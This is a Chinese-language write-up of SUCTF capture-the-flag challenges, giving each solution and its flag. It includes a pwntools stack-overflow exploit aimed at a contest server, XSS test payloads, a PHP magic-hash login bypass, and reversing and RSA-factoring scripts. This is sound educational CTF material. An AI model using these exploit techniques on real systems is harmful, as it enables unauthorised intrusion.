# SUCTF


### 这是你 hello pwn？
小伙伴大神做的
```
from pwn import *

pwn = remote('118.193.194.73',10000)

pwn.recvuntil('let\'s begin!\n')

payload = ''
payload += 'a'*112
payload += p32(0x0804865D)

pwn.sendline(payload)

pwn.interactive()
```
*SUCTF{5tack0verTlow_!S_s0_e4sy}*


### Web--flag 在哪？
在cookie里
*suctf{Thi5_i5_a_baby_w3b}*


### Web--编码
密码框，开firebug看下，在请求头里有password，base64多解几次得到明文，
然后submit被禁用，而且是get方式提交，用hackbar发过去即可
*suctf{SU_is_23333}*


### Web--XSS1
输入 `</pre><script>alert(1);</script>`   就剩下一个 `>`
输入`</pre><img src="javascript:alert('XSS')">`  剩下 `('XSS')">`
明神说 a标签可以，乱试了下 `<a href="alert(1);">` 得到了flag
*suctf{too_eaSy_Xss}*


### Web--PHP是世界上最好的语言
password经过md5之后前两位是0e就可以了，这样就是识别成0
http://45.63.58.62:8088/xedni.php?password=s878926199a
这样就可以
*suctf{PHP_!s_the_bEst_1anguage}*


### Web--( ゜- ゜)つロ 乾杯~
aaencode加brainfuck
aaencode可以直接控制台执行，好像复制有点麻烦[http://www.kwstu.com/ArticleView/kwstu_2014413102448223](http://www.kwstu.com/ArticleView/kwstu_2014413102448223)
这个可以在线运行js代码
brainfuck的[https://www.splitbrain.org/services/ook](https://www.splitbrain.org/services/ook)
解码即可
*suctf{aAenc0de_and_bra1nf\**k}*


### Web--你是谁？你从哪里来？（Open）
试过x-forwarded-for 和referer 都没用
Web--XSS2（Open）
过滤字符：< > {  }  / ! -


### Mobile--最基础的安卓逆向题
jeb打开，在MainActivity中有flag字符串
*suctf{Crack_Andr01d+50-3asy}*


### Mobile--Mob200（Open）
AES加密
密文是 :XclSH6nZEPVd41FsAsqeChz6Uy+HFzV8Cl9jqMyg6mMrcgSoM0vJtA1BpApYahCY


### Mobile--mips（Open）
secret：`X1p\5vYi8}Uc8j`  倒数第二个应该是0x7F,删除符


### Mobile--Mob300
这题跟第一个安卓题一样......
jeb打开，然后提取Libraries/armeabi/libnative-lib.so，用IDA打开，查看flag_gen函数，就是flag了......
*suctf{Meet_jni_50_fun}*


### Misc--签到
加群下载群文件flag.txt
*suctf{Welc0me_t0_suCTF}*


### Misc-50
一张gif图片，之前碰到过这种，使用Gifsplitter将gif图片分离成72个bmp图片
每个bmp图片大小7\*750，整个图片大小应该是504\*750
然后合在一起就可以
（图像操作参照[http://www.aichengxu.com/view/39904](http://www.aichengxu.com/view/39904)）

```
# !python2
# coding:utf-8

from PIL import Image

endImage = Image.new("RGBA",(504,750))

for i in range(72):
	imageName = "IMG" + "%05d"%i + ".bmp"
	singleImage = Image.open(imageName)
	endImage.paste(singleImage,(i*7,0))

endImage.show()

endImage.save("end.jpg","jpeg")
```

*suctf{t6cV165qUpEnZVY8rX}*


### Misc--Forensic-100
就是一个gzip文件，解压之后凯撒即可
*suctf{PC9ChUfTk#}*


### Misc--这不是客服的头像嘛。。。。23333
图片最后有压缩包，改后缀zip，解压之后img镜像，用winhex打开提取四张图片，组成一个二维码，扫一下即可
*suctf{bOQXxNoceB}*


### Misc--Forensic-250（赛后）
不知道Broken文件的文件类型，用file查过，只是说很长的字符串
Tips:Audio，
那就是跟音频有关，将文件里的空格都去掉，然后用winhex的16进制转二进制，最后加了一个wav格式的文件头，但是没有什么发现

今天跟出题人交流了下，知道怎么做了，虽然不算，也补上这题的做法
这是出题人出题的脚本，就是将字节转化成16进制表示：
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2016-10-28 12:52:44
# @Author  : Xu
# @Link    : ${link}
# @Version : $Id$

if __name__ == '__main__':
    f=open('2.mp3' ,'rb')
    f.seek(0,0)
    while True:
        byte = f.read(1)
        if byte == '':
            break
        else:
            hexstr =  "%s" % byte.encode('hex')
            decnum = int(hexstr, 16)
        print hexstr,
    f.close()
```
刚开始做错了，导致去找python的bit操作，太烦了，很久之后才想过来，可以先翻转顺序再转成二进制，这样就好办多了
```
# !/usr/bin/python
# coding:utf-8
# suctf{7dMXco4W8g3A}

f1 = open("Broken","rb")
con1 = f1.read()

f2 = open("Ok.mp3","wb")
for i in xrange(len(con1)-1,-1,-1):
	if con1[i] != " ":
		f2.write(con1[i])

# 因为每次读的是一个字节，也就是一个数字，所以没办法直接转化，
# 就只能先逆序之后再用winhex去处理一下

print "done"
```
这样之后再导入winhex，编辑→转换文件→十六进制ASCII到二进制
然后音频就可以正常播放了
用Audacity或者AU打开，看频谱图，就得到flag了
*suctf{7dMXco4W8g3A}*

### RE--先利其器
大概看下逻辑，翻一下字符即可
*suctf{I_c@n_U5e_I6a}*

### RE--PE_Format
找一个正常的PE文件，很容易发现头被修改了，用winhex大概改4，5行，就能正常运行了(改到”PE”字符即可)，是64位PE程序，然后 运行，但是输入什么东西都是闪退，可能修改错了，那就直接用IDA来分析吧，逻辑很简单，就是将输入的字符串的每个字符按位取反之后与程序中的一个串比较，那就把那个串提取出来处理一下即可
```
# !/usr/bin/python
# coding:utf-8

arr =  [0xBB, 0x90, 0xA0, 0xA6, 0x90, 0x8A, 0xA0, 0x94, 0x91, 0x90, 0x88, 0xA0, 0xAF, 0xBA, 0xA0, 0xB9, 0x90, 0x8D, 0x92, 0x9E, 0x8B, 0xC0]

str1 = ""
for index in arr:
	str1 += chr(~index&0xFF) #python中的按位取反比较怪,网上查的

print str1
```
*suctf{Do_You_know_PE_Format?}*


### RE--Find_correct_path
IDA看下发现v7控制进入switch，但是v7值为0，整个过程没有更改，so
用gdb调试，改v7的值，4个case都走一遍，第三个是flag
*suctf{hl5_way_ls_r!8ht}*


### Crypto--base？？
base32之后base64
*suctf{I_1ove_Su}*


### Crypto--凯撒大帝
手工分开，然后ascii转字符，然后是两个凯撒的移位结合起来，没怎么搞懂
```
# !python2
# coding:utf-8

lists = [111,113,110,101,98,123,69,95,108,120,95,89,119,112,100,119,110,125]

str1 = ""

for i in lists:
	str1 += chr(i)

print str1
```
转换完是这一个：oqneb{E_lx_Ywpdwn}
凯撒选两个，然后分别取一部分
surif{I_pb_Cathar}
dfctq{T_am_Nleslc}

*suctf{I_am_Caesar}*


### Crypto--easyRSA
大概过程就是这样，用kali做了。。搞不懂windows下python模块的玄学
1. 从pem公钥文件导出n,e
```
from Crypto.PublicKey import RSA
pub = RSA.importKey(open('public.pem').read())
n = long(pub.n)
e = long(pub.e)
```
2. 分解N成为 p，q
http://www.factordb.com/
3. 使用 RSA Tool2得到 d

4. 生成私钥并导出
```
n = 74207624142945242263057035287110983967646020057307828709587969646701361764263
e = 65537
d = 23071769375111040425287244625328797615295772814180109366784249976498215494337
from Crypto.PublicKey import RSA
key = RSA.construct((n,e,d))
key.exportKey()
open("private.pem","w").write(key.exportKey())
```

5. 用私钥解出密文
```
import rsa  #可能需要自己安装模块
p = open("private.pem").read()
privkey = rsa.PrivateKey.load_pkcs1(p)
crypto = open("flag.enc").read()
message = rsa.decrypt(crypto,privkey)
print message
```
*suctf{Rsa_1s_ea5y}*
(跟出题人交流之后觉得自己的方法有点费劲，用openssl和yafu就可以了)


### Crypto--普莱费尔
百度百科介绍的比较详细，按着步骤来就可以了
`C:pr ew gl qk ob bm xg ky zm vy ml `    这是密文

密码表
youar
elckb
dfghi
mnpqs
tvwxz

明文
`su ct fc ha rl es wh ea ts to ne`

整理之后就是flag
*suctf{charleswheatstone}*


### Crypto--很贱蛋呀
先对加密代码分析
```
# 密文：[75,30,30,215,104,138,69,213,248,30,179,212,105,33,213,249,105]

M=''	# 这是明文，

a=[]
for i in xrange(len(M)):
	a.append(ord(M[i]))
b=max(a)
print b
for key in xrange(10,b):	# 从这里来看，加密只有最后一轮有用，最后一轮取决于明文中ascii值最大的元素
	key=101*key
	print key
	encrypto=[]
	for i in xrange(len(M)):	# 按逻辑来看，明文与密文有相同的长度 17位
		x=a[i]
		am=(key+x)/2
		gm=ceil(key*x)
		enc=am+gm
		#print (enc)%255
		encrypto.append(int(enc)%255)  # 这里的255取模就比较尴尬了，不能逆推回去，所以需要正推，暴力吧


print encrypto
# 测试之后发现明文不包含ctf格式，暴力最大的字符，然后计算之后跟密文对比，符合即为正确答案
# 写程序测试
```

然后就写代码来跑了

```
# !/usr/bin/python
# coding:utf-8

import math

encc = [75,30,30,215,104,138,69,213,248,30,179,212,105,33,213,249,105]

# 既然不知道max(a)的值，那就试一下可打印字符的最大值到a为止
# 从~开始，到a结束，也就是126--97  找不到答案再向下扩展
for b in xrange(122,96,-1):
	print b
	key = 101*b
	ming = ""
	for i in xrange(17):
		for j in xrange(33,127): # 想的是到 b对应的ascii就对了，但是结果不正确，改成127才跑出正确答案
			x=j
			am=(key+x)/2
			gm=math.ceil(key*x)
			enc=am+gm
			if int(enc)%255 == encc[i]:
				ming += chr(x)

	print ming
```

在跑出来的结果中找有意义的字符串，发现是：Goodlucktobreakme
MD5加密一下，提交即可
*suctf{afa6910cb4fd7f4bc44dc20e1fe60f11}*
